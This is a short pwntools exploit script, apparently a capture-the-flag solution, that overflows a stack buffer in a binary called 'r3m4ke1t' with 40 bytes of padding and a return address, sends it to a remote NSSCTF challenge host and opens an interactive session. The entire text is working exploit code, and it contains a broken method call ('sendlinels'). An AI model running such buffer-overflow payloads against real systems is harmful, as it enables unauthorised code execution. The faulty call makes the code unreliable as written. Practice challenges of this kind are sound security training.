from pwn import*
#p=process('./r3m4ke1t')
p=remote('node4.anna.nssctf.cn',28585)
payload=b'a'*40+p64(0x40072d)
p.sendlinels(payload)
p.interactive()